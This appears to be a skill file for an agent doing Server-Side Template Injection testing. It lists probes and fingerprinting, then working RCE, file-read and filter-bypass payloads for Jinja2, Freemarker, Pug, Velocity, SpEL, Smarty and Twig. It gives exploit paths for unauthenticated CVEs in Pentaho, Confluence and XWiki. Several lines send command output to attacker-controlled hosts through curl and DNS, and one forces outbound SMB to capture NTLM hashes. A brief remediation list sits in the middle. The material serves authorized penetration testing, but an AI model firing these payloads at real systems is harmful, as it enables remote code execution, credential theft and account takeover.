---
name: ssti
description: Server-Side Template Injection testing covering detection, engine fingerprinting, and RCE exploitation
---

# Server-Side Template Injection (SSTI)

SSTI occurs when user input is embedded unsanitized into a server-side template, allowing code execution in the template engine context and often leading to RCE.

## Attack Surface

**Template Engines**
- Python: Jinja2, Mako, Tornado, Cheetah
- Java: Freemarker, Velocity, Pebble, Thymeleaf
- Node.js: Pug/Jade, Handlebars, EJS, Nunjucks, Twig.js
- Ruby: ERB, Slim, Liquid
- PHP: Twig, Smarty, Blade

**Injection Points**
- Error pages that echo user input
- Email templates, PDF generators
- Custom dashboards with user-controlled text
- Search fields, file names, URL paths reflected in responses

## Testing Methodology

### Step 1 – Polyglot Detection Probe
```
${{<%[%'"}}%\.
```
Errors or unusual output indicate a template context.

### Step 2 – Math Probe (Engine Agnostic)
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
```
If the response contains `49`, the input is being evaluated.

### Step 3 – Engine Fingerprinting
| Payload | Engine |
|---------|--------|
| `{{7*'7'}}` → `7777777` | Jinja2 / Twig |
| `${7*7}` → `49` | Freemarker / EL |
| `<%= 7*7 %>` → `49` | ERB / EJS |
| `#{7*7}` → `49` | Ruby ERB |
| `{{= 7*7 }}` → `49` | Pebble |

### Step 4 – RCE via Jinja2 (Python)
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
```

### Step 5 – RCE via Freemarker (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id")}
```

### Step 6 – RCE via Pug (Node.js)
```
#{root.process.mainModule.require('child_process').execSync('id')}
```

### Step 7 – Blind SSTI (Out-of-Band)
```
{{''.__class__.mro()[1].__subclasses__()[396]('curl attacker.com/$(id)',shell=True,stdout=-1).communicate()}}
```

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| RCE achieved | Critical |
| File read / environment variable disclosure | High |
| Template expression evaluated, no code exec | Medium |

## Remediation

- Never pass raw user input to template render functions
- Use sandboxed template environments (Jinja2 `SandboxedEnvironment`)
- Validate and escape all user data before template interpolation
- Use logic-less templates (Mustache) where dynamic execution is not needed


## Additional Techniques — ported from WebSkills (writeup-techniques/ssti)

### Fingerprint decision-tree (beyond the math probe)
Branch on *which* delimiter renders and *how* strings behave, not just on `49`:
- `{{7*'7'}}` → `7777777` = string-repeat engine (Jinja2/Twig/Nunjucks). Then split Twig-vs-JS-CSTI with `{{'a'.toUpperCase()}}`→`A` / `{{'a'.concat('b')}}`→`ab`; confirm Jinja2 with `{{''.__class__}}`.
- Django DTL vs Jinja2: DTL raises `TemplateSyntaxError`/500 on arithmetic and `{% %}` tags — a crash is still proof of compilation, not a failure.
- Comment-survival probe to spot Smarty/Twig: `a{*comment*}b` → `ab`.
- `${7*7}` only → Java stack (Freemarker/Velocity/SpEL/Thymeleaf); `<%= %>` only → Ruby/Node; `{{ }}` reflects but inert server-side → likely client-side (Angular/Vue) — test in-browser.

### Jinja2 gadgets not in fork (request-global, config dump, LFI, alt globals)
```
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ config }}   /   {{ config.items() }}   /   {{ self.__init__.__globals__ }}   (secret exfil, no RCE)
{% debug %}                                   (Debug Extension: dumps context/filters/tests)
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ get_flashed_messages.__globals__['__builtins__'].open('/etc/passwd').read() }}   (LFI)
```
Usable globals when `().` is filtered: `request`, `config`, `self`, `cycler`, `joiner`, `namespace`, `lipsum`, `url_for`, `get_flashed_messages`.

### Django DTL data exfil when Python-exec is filtered
`__builtins__` is blocked but the object graph is reachable; `.values()` coerces queryset rows to dicts and dumps all fields, bypassing `__`-name restrictions. Stored/second-order: save a marker-prefixed payload in a persisted field (username/bio), then request the rendering view.

### PHP Twig/Smarty specifics (fork only had the Twig filter-callback trick)
```
string:{php}echo `echo tbhaxor;CMD;echo tbhaxor`;{/php}   (Smarty string: resource loader — CMS Made Simple CVE-2017-16783)
{system('id')}   {php}system('id');{/php}   {$smarty.version}
{Smarty_Internal_Write_File::writeFile(...)}
{self::getStreamVariable("file:///etc/passwd")}           (Smarty arbitrary file read)
{{ ['id']|filter('system') }}                              (Twig alt to registerUndefinedFilterCallback)
```

### Apache Velocity — reflection → Runtime.exec
```
#set($e="e");$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id")
```
Apache Solr `wt=velocity` RCE via `v.template.custom` (URL-encode `#`→`%23`, `'`→`%27`); Confluence Widget Connector: upload a `.vm` file to personal-space attachments then load it as `_template` from the local path → LFI/RCE.

### Java SpEL / Thymeleaf / OGNL and unauth CVEs
```
${T(java.lang.Runtime).getRuntime().exec("id")}   #{T(java.lang.Runtime).getRuntime().exec("id")}
${@java.lang.Runtime@getRuntime().exec("id")}
```
- Pentaho CVE-2022-43769 (unauth SpEL): `/api/ldap/config/ldapTreeNodeChildren/require.js?url=%23{T(java.lang.Runtime).getRuntime().exec('CMD')}&mgrDn=a&pwd=a`
- Thymeleaf: abuse expression preprocessing `__${expr}__` and inlining `[[${...}]]` / `[(${...})]` (no custom string TemplateResolver needed).
- Confluence Freemarker CVE-2023-22527 (unauth): POST to `/template/aui/text-inline.vm`, smuggle OGNL through the Velocity/Struts context to reach `freemarker.template.utility.Execute`; slip filters with full `\uXXXX` escaping of `'`, `[`, `]`, `+`.
- XWiki `SolrSearch` Groovy CVE-2025-24893 (unauth GET): `}}}{{async}}{{groovy}}...exec...{{/groovy}}{{/async}}`.

### Ruby ERB / render-eval — file-as-code + log poisoning
`render`/`eval` executes any readable file whose contents parse as Ruby regardless of extension. `Pathname#cleanpath` collapses `../` without touching the FS, so prepend Ruby that gets written into a log line (start payload on a new line to escape the `#` comment), then `render` the poisoned log → RCE. Core: `<%= system('id') %>`, `<%= IO.popen('id').read %>`.

### Client-Side Template Injection (CSTI) — not covered in fork
When `{{ }}` reflects but stays inert server-side, test the JS framework in-browser:
```
{{constructor.constructor('alert(document.domain)')()}}
```
AngularJS `<1.6` needs a sandbox escape; `>=1.6` sandbox removed → reliable. Markers: `ng-app`/`ng-bind`/`ng-model`, Vue `v-` directives, Alpine `x-data`. Stored CSTI in profile/order fields fires on admin view → cross-user XSS/ATO.

### Filter / WAF bypasses (Jinja2-focused)
- Attr trick: `obj['__class__']` or `request|attr('__class__')` instead of `obj.__class__`.
- `_` blocked → hex/unicode inside `attr()`/`[...]`: `request['\x5f\x5fclass\x5f\x5f']` or `request|attr("__cla"+"ss__")`.
- `{{`/`}}` blocked → statement tags `{% set %}` / `{% print(...) %}`.
- Keyword filters (`os`/`popen`/`system`) → build strings dynamically (`["po"+"pen"]`) or smuggle the command via `request.args.c`.
- Tools: **Fenjing** (auto-fuzzes Jinja2 WAF filters), **tplmap** (`-u <url> --os-shell`).

### Escalation chains and confirmation
- SSTI→LFI→auth-bypass→RCE: CrushFTP CVE-2024-4040 reads outside the VFS sandbox, steals session cookies → admin → RCE.
- Config leak→ATO: `{{ config }}` leaks Flask `SECRET_KEY` → forge session cookies.
- Java engines → SSRF / outbound SMB (`\\attacker\share`) → NTLM capture.
- OOB confirmation for blind/no-reflection: exfil command output inside a DNS subdomain (`os.popen('curl http://x.$(id).collab')`) — Collaborator hit carries the output.
- Reporting: unauth CVEs (Confluence 2023-22527, Pentaho 2022-43769, CrushFTP 2024-4040, XWiki 2025-24893) are critical — call that out; stored SSTI in admin-rendered invoice/email fields = low-priv→RCE privilege jump.
